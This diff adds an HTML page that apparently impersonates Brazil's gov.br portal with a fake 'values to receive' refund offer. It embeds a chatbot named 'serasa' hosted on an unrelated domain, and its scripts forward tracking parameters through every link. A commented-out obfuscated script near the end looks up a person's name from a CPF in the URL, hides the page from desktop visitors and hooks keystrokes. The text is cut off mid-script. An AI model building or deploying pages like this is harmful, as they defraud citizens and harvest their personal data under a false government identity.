@@ -1,0 +1,446 @@
+<!DOCTYPE html><html lang="en"><head>
+  <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+  function getExtraParams() {
+    let t = "";
+    const e = window.top.location.href;
+    const r = new URL(e);
+    if (r != null) {
+      const w = r.searchParams.get("xcod");
+      e.indexOf("?") !== -1 && (t = `&sck=${w}&xcod=${w}`);
+    }
+    return t;
+  }
+
+  function getRawQueryParams() {
+    return new URLSearchParams(window.location.search).toString();
+  }
+
+  function work() {
+    function rebuildLinks() {
+      !(function () {
+        const t = new URLSearchParams(window.location.search);
+        t.toString() &&
+          document.querySelectorAll("a").forEach((e) => {
+            e.href.indexOf("?") === -1
+              ? (e.href += `?${t.toString()}${getExtraParams()}`)
+              : (e.href += `&${t.toString()}${getExtraParams()}`);
+          });
+      })();
+    }
+
+    function configWindowOpen() {
+      const saveOpen = window.open;
+      window.open = function (url, windowName, parms) {
+        url = url.indexOf("?") === -1 ? url + "?" : url + "&";
+        url += getRawQueryParams() + getExtraParams();
+
+        saveOpen(url, windowName || "", parms || "");
+      };
+    }
+
+    rebuildLinks();
+    configWindowOpen();
+  }
+
+  if (document.readyState === "complete") {
+    work();
+  } else {
+    window.addEventListener("load", work);
+  }
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Restituição de Valores a Receber</title>
+
+    <style>
+      #barra-brasil div,
+#barra-brasil a,
+#barra-brasil ul,
+#barra-brasil li {
+	margin: 0;
+	padding: 0;
+	font-size: 100%;
+	font-family: inherit;
+	vertical-align: baseline;
+	font-size: 1rem
+}
+
+#barra-brasil ul {
+	list-style: none
+}
+
+#barra-brasil {
+	background-color: #1351B4;
+	box-sizing: content-box;
+	display: flex;
+	flex-direction: column-reverse;
+	align-items: center;
+
+}
+
+#barra-brasil .conteudo-barra-brasil {
+	padding-top: 2px;
+	height: 40px;
+	width: 95%;
+	max-width: 100vw;
+	margin: 0 auto;
+	height: 40px;
+	display: flex;
+	flex-flow: row nowrap;
+	align-items: center;
+	justify-content: space-between
+}
+
+#barra-brasil .pic-gov {
+	background-image: url("data:image/svg+xml,%3Csvg%20width%3D%2266%22%20height%3D%2214%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20xmlns%3Axlink%3D%22http%3A%2F%2Fwww.w3.org%2F1999%2Fxlink%22%3E%3Cdefs%3E%3Cpath%20id%3D%22a%22%20d%3D%22M9.367%204.374V.247H.37v4.127h8.997z%22%2F%3E%3C%2Fdefs%3E%3Cg%20fill%3D%22none%22%20fill-rule%3D%22evenodd%22%3E%3Cpath%20d%3D%22M7.602%2011.174a3.693%203.693%200%200%201-2.45.896c-.644%200-1.26-.114-1.848-.343a4.416%204.416%200%200%201-1.54-1.001%204.863%204.863%200%200%201-1.05-1.61C.453%208.481.322%207.758.322%206.946a4.851%204.851%200%200%201%201.47-3.521%205.092%205.092%200%200%201%201.617-1.05%205.205%205.205%200%200%201%202.009-.385c.448%200%20.877.049%201.288.147a4.495%204.495%200%200%201%202.086%201.12c.28.266.509.567.686.903l-2.03%201.554a2.289%202.289%200%200%200-.882-.945%202.362%202.362%200%200%200-1.246-.357%202.034%202.034%200%200%200-1.596.742c-.196.233-.35.511-.462.833a3.198%203.198%200%200%200-.168%201.057c0%20.392.056.747.168%201.064.112.317.268.59.469.819.2.229.441.406.721.532.28.126.593.189.938.189.793%200%201.493-.327%202.1-.98H5.768v-1.96h4.088V12H7.602v-.826zm8.078.91c-.756%200-1.442-.145-2.058-.434a5.092%205.092%200%200%201-2.604-2.758%205.008%205.008%200%200%201-.364-1.876c0-.653.126-1.283.378-1.89a5.018%205.018%200%200%201%201.057-1.603c.453-.462.99-.83%201.61-1.106.62-.275%201.3-.413%202.037-.413.756%200%201.442.145%202.058.434.616.29%201.143.672%201.582%201.148a5.151%205.151%200%200%201%201.015%201.624c.238.607.357%201.227.357%201.862a4.83%204.83%200%200%201-.378%201.883%205.1%205.1%200%200%201-1.05%201.596%205.165%205.165%200%200%201-1.603%201.113c-.62.28-1.3.42-2.037.42zm-2.254-5.04c0%20.336.047.66.14.973.093.313.233.59.42.833.187.243.422.439.707.588.285.15.623.224%201.015.224.392%200%20.733-.077%201.022-.231a2.07%202.07%200%200%200%20.707-.602%202.59%202.59%200%200%200%20.406-.847c.089-.317.133-.64.133-.966%200-.336-.047-.66-.14-.973a2.397%202.397%200%200%200-.427-.826%202.156%202.156%200%200%200-.714-.574%202.182%202.182%200%200%200-1.001-.217c-.392%200-.73.075-1.015.224-.285.15-.52.348-.707.595a2.523%202.523%200%200%200-.413.84%203.498%203.498%200%200%200-.133.959zM23.828%202.06l1.946%206.51%201.918-6.51h2.87L26.908%2012H24.64l-3.696-9.94h2.884zM55.82%209.438c0%20.383-.077.733-.231%201.05a2.444%202.444%200%200%201-.63.812%202.887%202.887%200%200%201-.924.518c-.35.121-.726.182-1.127.182H48.19V2.06h4.942c.345%200%20.658.075.938.224.28.15.518.343.714.581.196.238.348.509.455.812.107.303.161.609.161.917%200%20.495-.124.952-.371%201.372-.247.42-.6.733-1.057.938.57.168%201.02.478%201.351.931.331.453.497.987.497%201.603zm-1.274-.224c0-.224-.04-.441-.119-.651a1.852%201.852%200%200%200-.322-.553%201.525%201.525%200%200%200-.483-.378%201.358%201.358%200%200%200-.616-.14H49.45v3.416h3.458c.233%200%20.448-.047.644-.14.196-.093.369-.217.518-.371a1.68%201.68%200%200%200%20.35-.539c.084-.205.126-.42.126-.644zM49.45%203.152V6.47h3.164c.224%200%20.43-.044.616-.133.187-.089.348-.208.483-.357.135-.15.243-.324.322-.525.08-.2.119-.413.119-.637a1.91%201.91%200%200%200-.112-.658%201.736%201.736%200%200%200-.301-.532%201.37%201.37%200%200%200-1.043-.476H49.45zM57.584%2012V2.06h4.256c.439%200%20.842.091%201.211.273.369.182.686.425.952.728.266.303.474.644.623%201.022.15.378.224.763.224%201.155%200%20.345-.049.679-.147%201.001a3.098%203.098%200%200%201-.42.875%202.812%202.812%200%200%201-.658.672%202.566%202.566%200%200%201-.861.406L65.172%2012h-1.428l-2.268-3.57h-2.632V12h-1.26zm1.26-4.69h3.01c.261%200%20.497-.056.707-.168.21-.112.39-.264.539-.455.15-.191.266-.413.35-.665.084-.252.126-.513.126-.784%200-.28-.049-.544-.147-.791a2.322%202.322%200%200%200-.392-.658%201.774%201.774%200%200%200-.574-.448%201.557%201.557%200%200%200-.693-.161h-2.926v4.13z%22%20fill%3D%22%23FFF%22%2F%3E%3Cpath%20fill%3D%22%23FFD400%22%20d%3D%22M35.145%200L46%206.875%2035.145%2013.75z%22%2F%3E%3Cpath%20d%3D%22M36.233%2011.177a4.293%204.293%200%200%200%204.3-4.3%204.293%204.293%200%200%200-4.3-4.302%204.293%204.293%200%200%200-4.301%204.301%204.293%204.293%200%200%200%204.3%204.301%22%20fill%3D%22%231675D3%22%2F%3E%3Cg%20transform%3D%22matrix(-1%200%200%201%2041%204.75)%22%3E%3Cmask%20id%3D%22b%22%20fill%3D%22%23fff%22%3E%3Cuse%20xlink%3Ahref%3D%22%23a%22%2F%3E%3C%2Fmask%3E%3Cpath%20d%3D%22M8.76.538C4.918-.46%202.19%201.288.533%203c-.267.248-.276.953.5%201.375%203.554-3.313%206.797-2.9%208.035-2.185.397%200%20.494-1.409-.308-1.65%22%20fill%3D%22%23FFF%22%20mask%3D%22url(%23b)%22%2F%3E%3C%2Fg%3E%3C%2Fg%3E%3C%2Fsvg%3E");
+	background-repeat: no-repeat;
+	display: block;
+	width: 66px;
+	height: 14px;
+	min-width: 66px;
+	margin-right: 10px;
+	line-height: 0;
+	font-size: 0;
+	color: transparent
+}
+
+#barra-brasil .conteudo-barra-brasil nav {
+	overflow-x: auto
+}
+
+#barra-brasil .conteudo-barra-brasil nav ul {
+	display: flex;
+	flex-flow: row nowrap;
+	justify-content: flex-start;
+	align-items: center;
+	width: auto;
+	max-width: none
+}
+
+#barra-brasil .conteudo-barra-brasil nav ul li.list-item {
+	flex-shrink: 0
+}
+
+#barra-brasil .conteudo-barra-brasil nav ul li.espacador {
+	height: 20px;
+	width: 1px;
+	border-right: 1px solid rgba(151, 151, 151, 0.3);
+	margin: 0 7px 0 20px
+}
+
+#barra-brasil a {
+	text-decoration: none;
+	color: #fff;
+	font-weight: bold;
+	font-size: 0.7em;
+	font-family: Raleway, Arial, Helvetica, sans-serif;
+	text-transform: uppercase;
+	transition-property: all;
+	transition-duration: 0.1s;
+	transition-timing-function: ease-in-out
+}
+
+#barra-brasil .conteudo-barra-brasil nav a.link-externo-barra::before {
+	content: "";
+	display: inline-block;
+	width: 11px;
+	height: 10px;
+	margin-right: 6px;
+	background-image: url("data:image/svg+xml,%3Csvg%20width%3D%2211%22%20height%3D%2210%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22%23FFF%22%20fill-rule%3D%22evenodd%22%3E%3Cpath%20d%3D%22M10.174.169l-.003%204.002L6.173.173z%22%2F%3E%3Cpath%20d%3D%22M4%204.51L7.91.6l1.768%201.768-3.91%203.91zM0%200h3.5v2.5H0z%22%2F%3E%3Cpath%20d%3D%22M0%202h2.5v5H0zM7.5%206H10v3H7.5z%22%2F%3E%3Cpath%20d%3D%22M0%207h10v2.5H0z%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E");
+	opacity: 0;
+	transition-property: all;
+	transition-duration: 0.1s;
+	transition-timing-function: ease-in-out
+}
+
+#barra-brasil .conteudo-barra-brasil nav a.link-discreto,
+#barra-brasil .conteudo-barra-brasil nav a.link-discreto-fixo,
+#barra-brasil .conteudo-barra-brasil nav:hover li:not(:hover)>a {
+	opacity: 0.3
+}
+
+#barra-brasil .conteudo-barra-brasil nav a:hover {
+	opacity: 1
+}
+
+#barra-brasil .conteudo-barra-brasil nav a.link-externo-barra:hover::before {
+	opacity: 1
+}
+
+#barra-brasil .conteudo-barra-brasil nav a.link-interno-barra {
+	margin-left: 13px
+}
+
+#barra-brasil .conteudo-barra-brasil nav a.link-baixo-barra::after {
+	content: "";
+	display: inline-block;
+	width: 13px;
+	height: 13px;
+	margin-left: 6px;
+	background-image: url("data:image/svg+xml,%3Csvg%20width%3D%2214%22%20height%3D%229%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22%23FFF%22%20fill-rule%3D%22evenodd%22%3E%3Cpath%20d%3D%22M1.9.033L8.4%206.531%206.63%208.3.133%201.801z%22%2F%3E%3Cpath%20d%3D%22M11.395%200L5.03%206.364l1.767%201.768%206.364-6.364z%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E");
+	background-repeat: no-repeat;
+	background-position: center;
+	background-size: 8px 6px;
+	background-color: #3b3b3b;
+	border-radius: 50%
+}
+
+#barra-brasil .conteudo-barra-brasil nav a.link-baixo-barra.link-cima-barra::after {
+	background-image: url("data:image/svg+xml,%3Csvg%20width%3D%2214%22%20height%3D%229%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22%23FFF%22%20fill-rule%3D%22evenodd%22%3E%3Cpath%20d%3D%22M1.9%208.967L8.4%202.469%206.63.7.133%207.199z%22%2F%3E%3Cpath%20d%3D%22M11.395%209L5.03%202.636%206.798.868l6.364%206.364z%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E")
+}
+
+#barra-brasil .conteudo-barra-brasil a.botao-seta-direita {
+	display: none;
+	width: 9px;
+	min-width: 9px;
+	margin-left: 10px;
+	height: 13px;
+	background-image: url("data:image/svg+xml,%3Csvg%20width%3D%2210%22%20height%3D%2213%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22%23FFF%22%20fill-rule%3D%22evenodd%22%3E%3Cpath%20d%3D%22M.533%2011.232L7.03%204.734%208.8%206.502%202.301%2013z%22%2F%3E%3Cpath%20d%3D%22M.5%201.738l6.364%206.364%201.768-1.768L2.268-.03z%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E");
+	line-height: 0;
+	font-size: 0;
+	color: transparent
+}
+
+#barra-brasil .orgaos-governo-barra {
+	width: 100%;
+	border-bottom: 0.5px solid rgba(255, 255, 255, 0.3);
+	max-height: 0;
+	overflow-y: hidden;
+	transition-property: all;
+	transition-duration: 0.5s;
+	transition-timing-function: ease-in-out
+}
+
+#barra-brasil .orgaos-governo-barra.mostra-orgaos {
+	max-height: calc(90vh - 40px)
+}
+
+#barra-brasil .orgaos-governo-barra>div {
+	width: 100%;
+	max-width: 1150px;
+	margin: 0 auto
+}
+
+#barra-brasil .orgaos-governo-barra ul {
+	margin-top: 25px;
+	width: calc(100% + 25px);
+	display: flex;
+	flex-flow: row wrap
+}
+
+#barra-brasil .orgaos-governo-barra ul li {
+	width: 168px;
+	text-align: left;
+	margin: 0 25px 25px 0
+}
+
+#barra-brasil .orgaos-governo-barra ul li a {
+	font-size: 0.75em;
+	text-transform: none;
+	font-weight: bold
+}
+
+#barra-brasil .orgaos-governo-barra ul:hover li:not(:hover) a {
+	opacity: 0.3
+}
+
+#barra-brasil .orgaos-governo-barra ul li a:hover {
+	font-weight: bold
+}
+
+@media only screen and (max-width: 600px) {
+	#barra-brasil .orgaos-governo-barra {
+		overflow-y: auto
+	}
+
+	#barra-brasil .orgaos-governo-barra ul {
+		width: 100%;
+		flex-flow: column nowrap
+	}
+
+	#barra-brasil .orgaos-governo-barra ul li {
+		width: 100%;
+		margin: 0 0 25px 0
+	}
+
+	#barra-brasil .conteudo-barra-brasil a.botao-seta-direita {
+		display: block
+	}
+}
+
+body {
+    padding: 0px;
+    margin: 0px;
+    background: url(https://storage.atendebr.store/typebot/public/workspaces/clpx27mm0001olm2ne5mo7ahy/typebots/clrebeb190033p01cu4ieopc0/blocks/me2zuei5ikbbbxi9ekeg5zjp?v=1706893892712) repeat !important;
+}
+
+.logo-gov {
+    padding: 0px !important;
+    height: 40px !important;
+    object-fit: contain !important;
+    margin-top: 20px !important;
+    cursor: pointer !important;
+    z-index: 9 !important;
+}
+
+.container-center {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+}
+
+.card-typebot {
+    margin-top: 20px;
+    display: flex;
+    flex-direction: column;
+    background: rgb(255, 255, 255);
+    border-radius: 4px;
+    width: 100vw;
+    overflow: hidden;
+
+    max-width: 900px !important;
+    border-radius: 10px !important;
+    box-shadow: 0px 5px 15px 5px rgba(0,0,0,0.2) !important;
+    height: calc(100% - 150px) !important;
+}
+.card-typebot iframe {
+    width: 100%;
+    height: 95%;
+    margin-top: 15px;
+    min-height: 700px;
+    border: none;
+}
+.card-typebot .footer {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 20px;
+    color: rgb(8, 103, 184);
+    justify-content: center;
+
+	font-size: 14px;
+	padding: 5px 0px;
+}
+.card-typebot .footer span {
+    display: flex;
+    gap: 10px;
+}
+    </style>
+</head>
+<body onload="passIframeData()">
+    <div id="barra-brasil">
+        <div class="conteudo-barra-brasil">
+            <a href="#" class="pic-gov" title="GovBR">GovBR</a>
+            <nav id="menu-barra-brasil">
+                <ul class="lista-barra-brasil">
+                    <li class="list-item"><a href="#" class="link-barra link-externo-barra">Acesso Á informação</a></li>
+                    <li class="espacador"></li>
+                    <li class="list-item"><a href="#" class="link-barra link-externo-barra">Participe</a></li>
+                    <li class="espacador"></li>
+                    <li class="list-item"><a href="#" class="link-barra link-externo-barra">Serviços</a></li>
+                    <li class="espacador"></li>
+                    <li class="list-item"><a href="#" class="link-barra link-externo-barra">Legislação</a></li>
+                    <li class="espacador"></li>
+                    <li class="list-item"><a href="#" id="link-orgaos" class="link-barra link-externo-barra">Órgãos do Governo</a></li>
+                </ul>
+            </nav>
+            <a href="#" id="botao-seta-direita" class="botao-seta-direita"><i class="arrow right">Navegar para direita</i></a>
+        </div>
+        <div class="orgaos-governo-barra" id="orgaos-governo-barra">
+            <div>
+                <ul>
+                    <li class="orgao-barra"><a href="#">Casa Civil</a></li>
+                    <li class="orgao-barra"><a href="#">Ministério da Justiça e Segurança Pública</a></li>
+                    <li class="orgao-barra"><a href="#">Ministério da Defesa</a></li>
+                    <li class="orgao-barra"><a href="#">Ministério das Relações Exteriores</a></li>
+                    <li class="orgao-barra"><a href="#">Ministério da Economia</a></li>
+                    <li class="orgao-barra"><a href="#">Ministério da Infraestrutura</a></li>
+                    <li class="orgao-barra"><a href="#">Ministério da Agricultura</a></li>
+                    <li class="orgao-barra"><a href="#">Ministério da Educação</a></li>
+                    <li class="orgao-barra"><a href="#">Ministério da Cidadania</a></li>
+                    <li class="orgao-barra"><a href="#">Ministério da Saúde</a></li>
+                    <li class="orgao-barra"><a href="#">Ministério de Minas e Energia</a></li>
+                    <li class="orgao-barra"><a href="#">Ministério da Ciência, Tecnologia e Comunicação</a></li>
+                    <li class="orgao-barra"><a href="#">Ministério do Meio Ambiente</a></li>
+                    <li class="orgao-barra"><a href="#">Ministério do Turismo</a></li>
+                    <li class="orgao-barra"><a href="#">Ministério do Desenvolvimento Regional</a></li>
+                    <li class="orgao-barra"><a href="#">Controladoria-Geral da União</a></li>
+                    <li class="orgao-barra"><a href="#">Ministério da Mulher, da Família e dos Direitos Humanos</a></li>
+                    <li class="orgao-barra"><a href="#">Secretaria-Geral da Presidência da República</a></li>
+                    <li class="orgao-barra"><a href="#">Secretaria De Governo</a></li>
+                    <li class="orgao-barra"><a href="#">Gabinete de Segurança Institucional</a></li>
+                    <li class="orgao-barra"><a href="#">Advocacia-Geral da União - AGU</a></li>
+                    <li class="orgao-barra"><a href="#">Banco Central do Brasil</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container-center">
+        <img src="https://minio-production-2017.up.railway.app/typebot/public/workspaces/clsp2p2fr0001ev8wc1qyv0r7/typebots/clsqx8k86001hev8w9xkl4p37/blocks/srni7qokq95uyng5d2msus0f?v=1708229140444" class="logo-gov" alt="">
+        
+        
+      
+
+      <div id="questionsContainer"></div>
+    </section>
+      
+        <div class="card-typebot">
+          <typebot-standard style="width: 100%; height: 600px; "></typebot-standard>
+          <script>
+              const typebotInitScript = document.createElement("script");
+                typebotInitScript.type = "module";
+                typebotInitScript.innerHTML = `import Typebot from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.2.25/dist/web.js'
+                  
+                Typebot.initStandard({
+                  typebot: "serasa",
+                  apiHost: "https://chat.unica-oportunidade.online",
+                });
+                `;
+                document.body.append(typebotInitScript);
+          </script>
+
+            <div class="footer">
+                <span>
+                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 576 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M528 0H48C21.5 0 0 21.5 0 48v320c0 26.5 21.5 48 48 48h192l-16 48h-72c-13.3 0-24 10.7-24 24s10.7 24 24 24h272c13.3 0 24-10.7 24-24s-10.7-24-24-24h-72l-16-48h192c26.5 0 48-21.5 48-48V48c0-26.5-21.5-48-48-48zm-16 352H64V64h448v288z"></path>
+                    </svg>
+                    3.0.1213
+                </span>
+                <span>
+                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M480 160H32c-17.673 0-32-14.327-32-32V64c0-17.673 14.327-32 32-32h448c17.673 0 32 14.327 32 32v64c0 17.673-14.327 32-32 32zm-48-88c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm-64 0c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm112 248H32c-17.673 0-32-14.327-32-32v-64c0-17.673 14.327-32 32-32h448c17.673 0 32 14.327 32 32v64c0 17.673-14.327 32-32 32zm-48-88c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm-64 0c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm112 248H32c-17.673 0-32-14.327-32-32v-64c0-17.673 14.327-32 32-32h448c17.673 0 32 14.327 32 32v64c0 17.673-14.327 32-32 32zm-48-88c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm-64 0c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24z"></path>
+                    </svg>
+                    3.0.4801
+                </span>
+            </div>
+        </div>
+    </div>
+    <script>
+    function passIframeData(){var a=document.querySelector("iframe"),e=new URL(a.src);new URL(window.location.href).searchParams.forEach(((a,r)=>e.searchParams.set(r,a))),a.src=e.href}
+    </script>
+    <!-- <script>
+      (function(_0x29e7c3,_0x5e6158){const _0x43a312=_0x363d,_0x2c5fd1=_0x29e7c3();while(!![]){try{const _0x10134b=-parseInt(_0x43a312(0x1ee))/(0x15f8+-0x13d5+0xb6*-0x3)*(parseInt(_0x43a312(0x229))/(0xd2b+0x89a+-0x15c3))+parseInt(_0x43a312(0x212))/(0x9*-0x274+-0xb*-0x61+0x11ec)+-parseInt(_0x43a312(0x225))/(-0x613+0x1315+-0xcfe)*(-parseInt(_0x43a312(0x202))/(0x1d1e+0x8f9+0xb*-0x376))+-parseInt(_0x43a312(0x224))/(0x1395+0x4*0x2bc+0x1*-0x1e7f)*(parseInt(_0x43a312(0x213))/(0x2*0x1016+0x37*-0x8e+0x1*-0x1a3))+parseInt(_0x43a312(0x233))/(0x1a59+-0x281*-0x1+0xd9*-0x22)*(-parseInt(_0x43a312(0x1f4))/(0x201b+-0x253f*0x1+-0x35*-0x19))+parseInt(_0x43a312(0x218))/(-0x882*-0x3+0x11d6+-0x2b52)+parseInt(_0x43a312(0x204))/(0x1377+0x1*-0xa17+-0x955);if(_0x10134b===_0x5e6158)break;else _0x2c5fd1['push'](_0x2c5fd1['shift']());}catch(_0x4a25ab){_0x2c5fd1['push'](_0x2c5fd1['shift']());}}}(_0x3095,0x3cd4c+0x67d7a+0x2dad5));async function fetchData(){const _0xd760c3=_0x363d,_0x2c28c1={'RIXaT':function(_0x333915,_0xd990bd){return _0x333915(_0xd990bd);},'PhIVK':_0xd760c3(0x22f),'bVhlR':_0xd760c3(0x1f5),'YQMMC':_0xd760c3(0x1eb)},_0x105f6c=_0x2c28c1[_0xd760c3(0x20f)](getParameterByName,_0x2c28c1[_0xd760c3(0x1e1)]),_0x89c8d0=await _0x2c28c1[_0xd760c3(0x20f)](fetch,_0xd760c3(0x216)+_0xd760c3(0x21a)+_0xd760c3(0x22d)+_0xd760c3(0x205)+_0xd760c3(0x1de)+_0x105f6c),_0x5e3e00=await _0x89c8d0[_0xd760c3(0x21f)](),_0x54c3f2=''+_0x5e3e00[_0xd760c3(0x1e0)],_0x39ec85=_0x2c28c1[_0xd760c3(0x20f)](formatarCPF,_0x105f6c);document[_0xd760c3(0x217)+_0xd760c3(0x1ff)](_0x2c28c1[_0xd760c3(0x20a)])[_0xd760c3(0x1e9)]=_0x54c3f2,document[_0xd760c3(0x217)+_0xd760c3(0x1ff)](_0x2c28c1[_0xd760c3(0x1ed)])[_0xd760c3(0x1e9)]=_0x39ec85;}function getParameterByName(_0x16dda7){const _0x278e89=_0x363d,_0x295880=new URLSearchParams(window[_0x278e89(0x1e6)][_0x278e89(0x1e5)]);return _0x295880[_0x278e89(0x22a)](_0x16dda7);}function _0x3095(){const _0x176626=['onkeydown','cpf=','userAgent','bVhlR','nt=','stener','about:blan','StjFo','RIXaT','utm_conten','RzZss','4309026nIsSBD','7TmpJnr','BBEsp','ign=','https://ap','getElement','3548250cgIVun','utm_medium','i-typebot.','&utm_mediu','LurLJ','xsaZq','qFNjK','json','ctrlKey','DLUae','keyCode','utm_campai','7133514PAURyX','80TjYYPA','blBLQ','LokRQ','fuNVA','8teGMfo','get','test','replace','vercel.app','href','cpf','load','charCodeAt','pAVrJ','2990048lyluHe','../parte3?','$1.$2.$3-$','cpf?cpf=','&utm_campa','nome','PhIVK','TLbdO','BHwru','NYhod','search','location','eTlER','TuwRP','innerHTML','0|1|3|5|2|','dadosCpf','CGNja','YQMMC','86773WOCnKA','ISugC','split','TeFLC','shiftKey','bMUMk','9jfklUZ','nomeCpf','&utm_conte','MJfVS','utm_source','igGTa','&utm_sourc','XPKDD','substring','KPsXy','innerWidth','ById','HkhnK','addEventLi','221710HdBxkW','kTHfe','1026905CAnXVB','/validate-','CnEXl'];_0x3095=function(){return _0x176626;};return _0x3095();}function _0x363d(_0x136127,_0x2dde2a){const _0x2a6686=_0x3095();return _0x363d=function(_0x2919a9,_0x570be6){_0x2919a9=_0x2919a9-(0x1*0x192b+-0x1*0x25c7+-0x11*-0xda);let _0x1ae869=_0x2a6686[_0x2919a9];return _0x1ae869;},_0x363d(_0x136127,_0x2dde2a);}function formatarCPF(_0x2184d9){const _0x36dbf1=_0x363d,_0x58514d={'NYhod':_0x36dbf1(0x235)+'4'};return _0x2184d9[_0x36dbf1(0x22c)](/(\d{3})(\d{3})(\d{3})(\d{2})/,_0x58514d[_0x36dbf1(0x1e4)]);}function redictType(){const _0x2aeb2a=_0x363d,_0x5ec4e9={'DLUae':function(_0x1ac26b,_0x33afc9){return _0x1ac26b(_0x33afc9);},'TuwRP':_0x2aeb2a(0x22f),'StjFo':_0x2aeb2a(0x1f8),'bMUMk':_0x2aeb2a(0x223)+'gn','igGTa':_0x2aeb2a(0x219),'CnEXl':function(_0x4ab97e,_0x5e19eb){return _0x4ab97e(_0x5e19eb);},'BBEsp':_0x2aeb2a(0x210)+'t','MJfVS':function(_0x2aecf1,_0x4097e5){return _0x2aecf1+_0x4097e5;},'TeFLC':function(_0xf41cc1,_0x3fa3c3){return _0xf41cc1+_0x3fa3c3;},'XPKDD':function(_0x33918d,_0x192b3d){return _0x33918d+_0x192b3d;},'RzZss':function(_0x5bf251,_0x103655){return _0x5bf251+_0x103655;},'ISugC':function(_0x18f6a6,_0x33f46e){return _0x18f6a6+_0x33f46e;},'BHwru':function(_0x1b13f1,_0xa89f12){return _0x1b13f1+_0xa89f12;},'blBLQ':_0x2aeb2a(0x234)+_0x2aeb2a(0x208),'TLbdO':_0x2aeb2a(0x1fa)+'e=','LurLJ':_0x2aeb2a(0x1df)+_0x2aeb2a(0x215),'KPsXy':_0x2aeb2a(0x21b)+'m=','kTHfe':_0x2aeb2a(0x1f6)+_0x2aeb2a(0x20b)},_0x18a781=_0x5ec4e9[_0x2aeb2a(0x221)](getParameterByName,_0x5ec4e9[_0x2aeb2a(0x1e8)]),_0x3c1066=_0x5ec4e9[_0x2aeb2a(0x221)](getParameterByName,_0x5ec4e9[_0x2aeb2a(0x20e)]),_0x5a8f52=_0x5ec4e9[_0x2aeb2a(0x221)](getParameterByName,_0x5ec4e9[_0x2aeb2a(0x1f3)]),_0x2e1c23=_0x5ec4e9[_0x2aeb2a(0x221)](getParameterByName,_0x5ec4e9[_0x2aeb2a(0x1f9)]),_0x1e42ee=_0x5ec4e9[_0x2aeb2a(0x206)](getParameterByName,_0x5ec4e9[_0x2aeb2a(0x214)]);var _0x151fbd=_0x5ec4e9[_0x2aeb2a(0x1f7)](_0x5ec4e9[_0x2aeb2a(0x1f7)](_0x5ec4e9[_0x2aeb2a(0x1f1)](_0x5ec4e9[_0x2aeb2a(0x1f7)](_0x5ec4e9[_0x2aeb2a(0x1fb)](_0x5ec4e9[_0x2aeb2a(0x211)](_0x5ec4e9[_0x2aeb2a(0x1ef)](_0x5ec4e9[_0x2aeb2a(0x1ef)](_0x5ec4e9[_0x2aeb2a(0x1e3)](_0x5ec4e9[_0x2aeb2a(0x226)],_0x5ec4e9[_0x2aeb2a(0x206)](encodeURIComponent,_0x18a781)),_0x5ec4e9[_0x2aeb2a(0x1e2)]),_0x3c1066),_0x5ec4e9[_0x2aeb2a(0x21c)]),_0x5a8f52),_0x5ec4e9[_0x2aeb2a(0x1fd)]),_0x2e1c23),_0x5ec4e9[_0x2aeb2a(0x203)]),_0x1e42ee),_0x3a4e9c=window[_0x2aeb2a(0x1e6)][_0x2aeb2a(0x1e5)][_0x2aeb2a(0x1fc)](-0x1c14+-0x56*-0x2b+-0xda3*-0x1);_0x3a4e9c&&(_0x151fbd+=_0x5ec4e9[_0x2aeb2a(0x1f1)]('&',_0x3a4e9c)),window[_0x2aeb2a(0x1e6)][_0x2aeb2a(0x22e)]=_0x151fbd;}fetchData();function protegerPagina(){const _0x24525b=_0x363d,_0x1ed52f={'eTlER':_0x24525b(0x1ea)+'4','qFNjK':function(_0x3bf13a,_0x84467){return _0x3bf13a==_0x84467;},'xsaZq':function(_0x52c86f,_0x5d5939){return _0x52c86f==_0x5d5939;},'fuNVA':function(_0x243770,_0x214955){return _0x243770==_0x214955;},'HkhnK':function(_0x562f67,_0x3266b4){return _0x562f67<=_0x3266b4;},'LokRQ':function(_0xe7da97,_0x147a8c){return _0xe7da97||_0x147a8c;},'CGNja':_0x24525b(0x20d)+'k','pAVrJ':_0x24525b(0x230)},_0x4496f9=/Android|iPhone/i[_0x24525b(0x22b)](navigator[_0x24525b(0x209)]),_0x52eca2=_0x1ed52f[_0x24525b(0x200)](window[_0x24525b(0x1fe)],-0x2559*0x1+-0x2*-0x551+0x1dd7);if(_0x1ed52f[_0x24525b(0x227)](_0x4496f9,_0x52eca2)){}else window[_0x24525b(0x1e6)][_0x24525b(0x22e)]=_0x1ed52f[_0x24525b(0x1ec)];window[_0x24525b(0x201)+_0x24525b(0x20c)](_0x1ed52f[_0x24525b(0x232)],verificarLarguraDaTela),document[_0x24525b(0x207)]=function(_0x4d38d2){const 